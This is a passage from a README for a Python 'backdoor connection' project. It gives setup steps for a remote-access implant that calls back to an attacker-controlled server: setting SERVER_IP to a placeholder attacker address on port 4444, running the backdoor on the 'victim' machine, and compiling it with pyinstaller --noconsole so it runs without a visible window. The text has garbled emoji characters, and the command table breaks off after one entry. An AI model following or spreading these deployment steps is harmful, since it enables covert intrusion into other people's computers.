## üìÅ Project Structure

```
üì¶Backdoor-Connection-Using-Python
 ‚î£ üìúbackdoor.py   # Script to be executed on the target machine
 ‚î£ üìúserver.py     # Script run by the attacker to control the target
 ‚îó üìúREADME.md     # Project documentation

## ‚öôÔ∏è Requirements

- Python 3.x
- [Pillow](https://pypi.org/project/Pillow/) (for screenshots)

Install dependencies:

```bash
pip install pillow
```

---

## üöÄ Usage

### 1. Configure IP and Port

Update the following in both `server.py` and `backdoor.py`:

```python
SERVER_IP = "YOUR.ATTACKER.IP"
SERVER_PORT = 4444
```

### 2. Run the Server (Attacker)

```bash
python3 server.py
```

Wait for the incoming connection.

### 3. Deploy the Backdoor (Victim)

```bash
python3 backdoor.py
```

> Optionally, compile `backdoor.py` into an executable using `pyinstaller`:

```bash
pip install pyinstaller
pyinstaller --noconsole --onefile backdoor.py
```

## üíª Available Commands

Once connected, use the following commands from the attacker's terminal:

| Command              | Description                             |
|----------------------|-----------------------------------------|
| `cd <path>`          | Change directory on the victim's system |
